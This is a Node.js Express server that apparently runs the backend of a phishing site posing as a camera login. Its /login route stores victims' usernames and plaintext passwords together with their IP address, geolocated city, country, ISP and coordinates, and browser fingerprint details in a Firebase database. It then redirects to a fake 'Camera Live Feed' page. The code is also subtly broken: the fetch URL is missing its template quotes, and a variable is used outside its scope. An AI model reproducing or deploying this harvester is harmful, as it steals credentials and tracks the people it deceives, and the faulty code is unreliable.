const express = require("express");
const bodyParser = require("body-parser");
const admin = require("firebase-admin");

const app = express();

// 🔥 Middleware
app.set("trust proxy",true);
app.use(bodyParser.json());
app.use(bodyParser.urlencoded({ extended: true }));
app.use(express.static("public"));

// 🔥 Firebase setup
const serviceAccount = JSON.parse(process.env.FIREBASE_KEY);

admin.initializeApp({
  credential: admin.credential.cert(serviceAccount),
  databaseURL: "https://smartcamx100-default-rtdb.firebaseio.com/"
});

const db = admin.database();

// 📡 Login data receive panna
app.post("/login", async (req, res) => {
  const data = req.body;

  const rawIP =
    req.headers["x-forwarded-for"] ||
    req.socket.remoteAddress ||
    req.ip;

  const ip = rawIP ? rawIP.split(",")[0].trim() : "0.0.0.0";

  console.log("IP:", ip);

  let city = "N/A";
  let country = "N/A";

  try {
    const geoRes = await fetch(https://ipwho.is/${ip});
    const geoData = await geoRes.json();

    console.log("GeoData:", geoData);

    if (geoData.success) {
      city = geoData.city || "N/A";
      country = geoData.country || "N/A";
    }
  } catch (err) {
    console.log("Geo API error:", err);
  }
  const ref = db.ref("loginAttempts").push();
   await ref.set({
    time: new Date().toLocaleString(),
   ip:ip,
    country:country||"N/A",
    city:city||"N/A",
    isp:geoData.isp||"N/A",
    lat:geoData.lat||"N/A",
    lon:geoData.lon||"N/A",
    username: data.username || "N/A",
    password: data.password || "N/A",
    userAgent: data.agent || "N/A",
    platform: data.platform || "N/A",
    language: data.language || "N/A",
    screen: data.screen || "N/A"
  });

  console.log("🔥 Data received:", data);

  res.redirect("/dashboard");
});

// 📊 Dashboard
app.get("/dashboard", (req, res) => {
  res.send("<h2>Camera Live Feed</h2><p>Status: Online</p>");
});

// 🚀 Server start
const PORT = process.env.PORT || 3000;

app.listen(PORT, () => {
  console.log("Server running on port " + PORT);
});
